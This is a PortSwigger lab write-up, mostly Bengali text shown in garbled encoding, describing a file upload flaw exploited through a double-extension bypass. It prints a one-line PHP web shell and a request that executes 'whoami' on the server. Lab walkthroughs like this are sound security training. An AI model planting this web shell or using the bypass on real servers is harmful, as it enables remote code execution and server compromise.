
ЁЯзк File Upload Vulnerability
ЁЯУЪ PortSwigger Lab Write-up (Solved by Me)


ЁЯОп Vulnerability Name
File Upload Vulnerability


ЁЯза File Upload Vulnerability ржХрзА?
The application does not validate the user uploaded file correctly. The application does not check the file properly.
File type, extension, MIME type ржмрж╛ content check ржжрзБрж░рзНржмрж▓ рж╣рзЯ
Attacker server-ржП executable file upload ржХрж░рждрзЗ ржкрж╛рж░рзЗред
ржПрж░ ржорж╛ржзрзНржпржорзЗ attacker:

Web shell upload ржХрж░рждрзЗ ржкрж╛рж░рзЗ
Remote Code Execution (RCE) ржирж┐рждрзЗ ржкрж╛рж░рзЗ
Server compromise ржХрж░рждрзЗ ржкрж╛рж░рзЗ

ЁЯФН Initial Observation (ржЖржорж┐ ржХрзАржнрж╛ржмрзЗ рж╢рзБрж░рзБ ржХрж░рж┐)
ржЖржорж┐ profile image upload feature ржжрзЗржЦржЫрж┐ред
Burp Suite ржжрж┐рзЯрзЗ request intercept ржХрж░рзЗ ржжрзЗржЦрж┐:

POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data

ржЖржорж┐ ржмрзБржЭрждрзЗ ржкрж╛рж░рж┐:

The backend is doing file upload.
Server-side validation test ржХрж░рж╛ ржжрж░ржХрж╛рж░

ЁЯФО Normal Upload Test
ржЖржорж┐ ржкрзНрж░ржержорзЗ normal image upload ржХрж░рж┐ред

File: test.jpg
тЬФя╕П Upload рж╕ржлрж▓ рж╣рзЯ
тЮбя╕П Image profile ржП ржжрзЗржЦрж╛ ржпрж╛рзЯ

ржПрждрзЗ ржирж┐рж╢рзНржЪрж┐ржд рж╣ржЗ:

Upload functionality ржарж┐ржХржнрж╛ржмрзЗ ржХрж╛ржЬ ржХрж░ржЫрзЗ

тЭМ Direct Malicious Upload (Blocked)
ржПрж░ржкрж░ ржЖржорж┐ рж╕рж░рж╛рж╕рж░рж┐ PHP file upload ржХрж░рж╛рж░ ржЪрзЗрж╖рзНржЯрж╛ ржХрж░рж┐:

shell.php

тЭМ Result:

Error message
Upload reject рж╣рзЯ
тЮбя╕П ржмрзБржЭрж▓рж╛ржо:

Server extension validation ржХрж░ржЫрзЗ

ЁЯФО Analysis 

Validation рж╢рзБржзрзБржорж╛рждрзНрж░ extension ржжрзЗржЦрзЗ
MIME type ржмрж╛ content proper verify ржХрж░ржЫрзЗ ржирж╛
рждрж╛ржЗ ржЖржорж┐ double extension bypass ржЪрзЗрж╖рзНржЯрж╛ ржХрж░рж┐ред


ЁЯТе Successful Exploitation (Double Extension)
тЬФя╕П Payload File:
shell.php.jpg

File content:

<?php system($_GET['evil']); ?>

ЁЯФе Result:
The File uploaded successfully рж╣ржпрж╝
The uploaded file is stored in the directory.

ЁЯФУ Code Execution Test
I access the file in the browser. I open the file in the browser. See its contents instantly.

/files/avatars/shell.php.jpg?evil=whoami

Response:

www-data

тЮбя╕П ржПржЦрж╛ржирзЗржЗ ржирж┐рж╢рзНржЪрж┐ржд рж╣рзЯ
Remote Code Execution рж╕ржорзНржнржм

